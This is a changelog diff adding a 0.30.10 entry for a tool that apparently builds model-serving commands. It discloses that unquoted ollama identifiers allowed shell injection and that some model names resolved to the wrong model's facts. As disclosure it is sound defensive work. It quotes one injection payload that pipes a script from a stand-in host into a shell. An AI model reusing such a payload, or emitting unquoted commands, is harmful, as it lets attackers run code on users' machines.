@@ -7,6 +7,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [0.30.10] - 2026-09-04
+
 ### Fixed
 - **Shell injection reached the one backend the fix missed.** 0.30.9 quoted the model identifier for vllm/tgi/sglang but left `ollama run {tag}` raw -- and ollama wins the default plan for most registry queries, so it is the most-emitted command, not an edge case. `ollama run llama3.2:3b; curl evil.sh | sh` was produced verbatim for a human to paste. The test class asserting this property parametrized exactly the three backends that were already correct.
 - **An identifier naming a different model generation resolved to the wrong model's facts.** 0.30.1 stopped `llama3.1:405b` becoming an 8B, but only when a size token parsed. `phi-4` carries none, and the `phi` family has exactly one registry member, so it returned phi-2: **2.78B params and 6.69 GB for a 14.66B model**, with phi-2's measured quality and refusal rate attached. A generation marker that differs is now refused; an absent one (`phi:latest`) still resolves, since that is not a claim about a different model.
